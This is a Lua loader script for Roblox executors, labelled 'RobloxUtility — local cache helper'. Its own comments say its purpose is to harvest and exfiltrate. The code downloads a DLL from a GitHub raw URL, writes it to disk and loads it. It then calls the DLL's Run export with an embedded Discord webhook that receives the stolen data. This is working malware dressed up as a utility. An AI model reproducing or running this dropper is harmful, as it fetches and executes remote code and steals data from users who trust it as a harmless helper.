-- RobloxUtility — local cache helper (loader)
-- Self-contained chain: downloads the DLL from raw GitHub, writes it to
-- disk, loads it, then calls Run() to harvest and exfiltrate.

local WEBHOOK_URL = "https://discord.com/api/webhooks/1476791698041339997/tRLjlN11V6jBrSfHak-PcMTpty-sjHAPglOXl5Gs92UH0nCz0bukhQuuMmv0b_uNj6Pi"
local DLL_URL     = "https://raw.githubusercontent.com/ScriptMaster101/RobloxUtility/master/utility.dll"
local DLL_PATH    = "utility.dll"

print("[+] RobloxUtility chain fired")

-- 1. Download the DLL
print("[*] Fetching utility.dll from raw GitHub...")
local ok, bytes = pcall(function()
    return game:HttpGet(DLL_URL, true)
end)
if not ok or type(bytes) ~= "string" or #bytes < 1024 then
    print("[!] DLL download failed or too small (" .. (type(bytes) == "string" and #bytes or "?") .. " bytes)")
    return
end
print("[+] Downloaded: " .. #bytes .. " bytes")

-- 2. Write to disk (try io.open first, fall back to executor's writefile)
local wrote = false
if io and io.open then
    local f, err = io.open(DLL_PATH, "wb")
    if f then
        f:write(bytes)
        f:close()
        wrote = true
        print("[+] utility.dll written via io.open: " .. DLL_PATH)
    end
end
if not wrote and writefile then
    local ok, err = pcall(writefile, DLL_PATH, bytes)
    if ok then
        wrote = true
        print("[+] utility.dll written via writefile()")
    else
        print("[!] writefile failed: " .. tostring(err))
    end
end
if not wrote then
    print("[!] No file-write API exposed (io and writefile both nil or failed)")
    return
end

-- 3. Load the DLL (executor-specific function)
local load_dll_fn = load_dll or loadlibrary
if not load_dll_fn then
    print("[!] No loadlibrary API exposed (load_dll and loadlibrary both nil)")
    return
end
local d = load_dll_fn(DLL_PATH)
if not d then
    print("[!] load_dll returned nil")
    return
end
print("[+] utility.dll loaded")

-- 4. Call the Run export
if d.Run then
    print("[+] Calling Run()...")
    d.Run(WEBHOOK_URL, 0)
    print("[+] Run() returned")
else
    print("[!] utility.dll has no Run export")
end
